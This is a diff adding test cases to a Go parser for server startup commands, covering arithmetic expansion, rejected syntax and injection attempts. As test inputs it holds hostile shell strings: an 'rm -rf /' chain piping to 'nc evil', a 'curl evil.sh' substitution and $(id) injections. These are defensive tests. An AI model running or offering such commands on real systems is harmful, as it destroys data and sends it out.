@@ -45,6 +45,7 @@ var stdEnv = env(
 	"SPACED=my server.jar", "UNICODE=wörld-世界.jar",
 	"INJECT=x; rm -rf / && $(id) `id` | nc evil 1 > /etc/passwd",
 	"GLOBBY=*.jar", "QUOTES=\"a b\" 'c d'",
+	"NEG=-512", "ZERO=0", "ARRAY=a[$(id)]", "EXPR=2+3", "OCTAL=010", "PADDED= 42",
 )
 
 func TestParseValid(t *testing.T) {
@@ -101,6 +102,19 @@ func TestParseValid(t *testing.T) {
 		{"quoted glob is literal", `java -jar "server*.jar"`, []string{"server1.jar"}, []string{"java", "-jar", "server*.jar"}, nil},
 		{"unclosed bracket is literal", `java -Dx=[a`, nil, []string{"java", "-Dx=[a"}, nil},
 		{"absolute path command", `/usr/bin/java -version`, nil, []string{"/usr/bin/java", "-version"}, nil},
+		{"arithmetic panel memory idiom", "java -Xms$(({{SERVER_MEMORY}}*80/100))M -Xmx$(({{SERVER_MEMORY}}*80/100))M -jar {{SERVER_JARFILE}}", nil,
+			[]string{"java", "-Xms3276M", "-Xmx3276M", "-jar", "server.jar"}, nil},
+		{"arithmetic variable forms", "java $(( $SERVER_MEMORY - ${SERVER_PORT} % 1000 + SERVER_MEMORY / 2 + NEG ))", nil,
+			[]string{"java", "5067"}, nil},
+		{"arithmetic precedence and sign", "java $((2+3*4)) $(((2+3)*4)) $((-7/2)) $((-7%3)) $((- -3)) $((+5)) $((2*-3)) $((0))", nil,
+			[]string{"java", "14", "20", "-3", "-1", "3", "5", "-6", "0"}, nil},
+		{"arithmetic whitespace and newlines", "java $((\n  SERVER_MEMORY\t*\r\n2 ))", nil, []string{"java", "8192"}, nil},
+		{"arithmetic in double quotes", `java "-Dheap=$((SERVER_MEMORY/2)) MB"`, nil, []string{"java", "-Dheap=2048 MB"}, nil},
+		{"arithmetic in assignment", `HEAP=$((SERVER_MEMORY/2))M java`, nil, []string{"java"}, []Assignment{{"HEAP", "2048M"}}},
+		{"arithmetic negative result", "java -Dx=$((NEG-1))", nil, []string{"java", "-Dx=-513"}, nil},
+		{"arithmetic int64 bounds", "java $((-9223372036854775807-1)) $((9223372036854775807))", nil,
+			[]string{"java", "-9223372036854775808", "9223372036854775807"}, nil},
+		{"arithmetic result is never globbed", "java $((1))*", []string{"1a"}, []string{"java", "1a"}, nil},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -195,7 +209,29 @@ func TestRejected(t *testing.T) {
 		{"subshell", "(java -jar x)", `operator "("`},
 		{"arbitrary command substitution", "java $(curl evil.sh)", "unsupported command substitution"},
 		{"backtick command", "java `id`", "unsupported command substitution"},
-		{"arithmetic", "java -Xmx$((SERVER_MEMORY-512))M", "arithmetic"},
+		{"arithmetic command substitution", "java $(( $(id) ))", "not supported inside $((...))"},
+		{"arithmetic nested", "java $(( $((1)) ))", "not supported inside $((...))"},
+		{"arithmetic octal literal", "java $((010))", "not a decimal integer"},
+		{"arithmetic hex literal", "java $((0x10))", "not a decimal integer"},
+		{"arithmetic base literal", "java $((16#ff))", "not a decimal integer"},
+		{"arithmetic literal too large", "java $((9223372036854775808))", "64-bit"},
+		{"arithmetic assignment", "java $((SERVER_MEMORY=1))", `operator "="`},
+		{"arithmetic compound assignment", "java $((SERVER_MEMORY*=2))", `operator "*="`},
+		{"arithmetic increment", "java $((SERVER_MEMORY++))", `operator "++"`},
+		{"arithmetic decrement", "java $((--SERVER_MEMORY))", `operator "--"`},
+		{"arithmetic power", "java $((2**3))", `operator "**"`},
+		{"arithmetic comparison", "java $((1<2))", `operator "<"`},
+		{"arithmetic comma", "java $((1,2))", `operator ","`},
+		{"arithmetic ternary", "java $((1?2:3))", `operator "?"`},
+		{"arithmetic array subscript", "java $((SERVER_MEMORY[1]))", `unexpected '['`},
+		{"arithmetic quotes", `java $(("1"))`, `unexpected '"'`},
+		{"arithmetic missing operand", "java $((1+))", "expected a number"},
+		{"arithmetic missing operator", "java $((1 2))", "expected an operator"},
+		{"arithmetic unbalanced", "java $((1+(2))", "expected an operator or '))'"},
+		{"arithmetic split close", "java $((1+2) )", "expected an operator or '))'"},
+		{"arithmetic unterminated", "java $((1+2", "unterminated $(("},
+		{"arithmetic nested too deeply", "java $((" + strings.Repeat("(", 40) + "1" + strings.Repeat(")", 40) + "))", "nested too deeply"},
+		{"arithmetic unary nested too deeply", "java $((" + strings.Repeat("- ", 40) + "1))", "nested too deeply"},
 		{"parameter default", "java ${SERVER_MEMORY:-1024}", "unsupported parameter expansion"},
 		{"positional parameter", "java $1", "unsupported expansion $1"},
 		{"special parameter", "java $@", "unsupported expansion $@"},
@@ -250,6 +286,21 @@ func TestExpansionErrors(t *testing.T) {
 		{"only empty variable", "{{EMPTY}}", "no command", Options{}},
 		{"cat missing file", "java `cat nope.txt`", "cat \"nope.txt\"", Options{}},
 		{"whitespace var unquoted in idiom", "java $( [[ -f {{SPACED}} ]] && printf %s x )", "contains whitespace", Options{}},
+		{"arithmetic injection via subscript", "java $((ARRAY*2))", `variable ARRAY is "a[$(id)]"`, Options{}},
+		{"arithmetic injection via braces", "java $(({{ARRAY}}))", "needs a decimal integer", Options{}},
+		{"arithmetic value is not re-evaluated", "java $(($EXPR*2))", `variable EXPR is "2+3"`, Options{}},
+		{"arithmetic value with spaces", "java $((${PADDED}))", "needs a decimal integer", Options{}},
+		{"arithmetic octal value", "java $((OCTAL))", "no leading zeros", Options{}},
+		{"arithmetic other text value", "java $((SERVER_JARFILE))", "needs a decimal integer", Options{}},
+		{"arithmetic empty value", "java $((EMPTY+1))", "needs a decimal integer", Options{}},
+		{"arithmetic unset", "java $((NOPE+1))", "variable NOPE is not set", Options{}},
+		{"arithmetic unset allowed is still not a number", "java $((NOPE+1))", "needs a decimal integer", Options{AllowUnset: true}},
+		{"arithmetic division by zero", "java $((1/ZERO))", "division by zero", Options{}},
+		{"arithmetic modulo by zero", "java $((1%(SERVER_MEMORY-4096)))", "division by zero", Options{}},
+		{"arithmetic overflow add", "java $((9223372036854775807+1))", "64-bit", Options{}},
+		{"arithmetic overflow mul", "java $((SERVER_MEMORY*9223372036854775807))", "64-bit", Options{}},
+		{"arithmetic overflow negate", "java $((-(-9223372036854775807-1)))", "64-bit", Options{}},
+		{"arithmetic overflow divide", "java $(((-9223372036854775807-1)/-1))", "64-bit", Options{}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -329,7 +380,7 @@ func TestRequiresLookup(t *testing.T) {
 // FuzzParse checks that no input crashes the parser and that every produced
 // argument is free of NUL bytes and within limits.
 func FuzzParse(f *testing.F) {
-	for _, s := range []string{forgeIdiom, "java -jar {{SERVER_JARFILE}}", `a "b\"c" 'd' $X ${Y} {{Z}} $(cat f) \` + "`cat f`", "A=1 java *"} {
+	for _, s := range []string{forgeIdiom, "java -jar {{SERVER_JARFILE}}", `a "b\"c" 'd' $X ${Y} {{Z}} $(cat f) \` + "`cat f`", "A=1 java *", "java -Xmx$(({{SERVER_MEMORY}}*80/100))M $((-(NEG+1)%7))"} {
 		f.Add(s)
 	}
 	dir := f.TempDir()
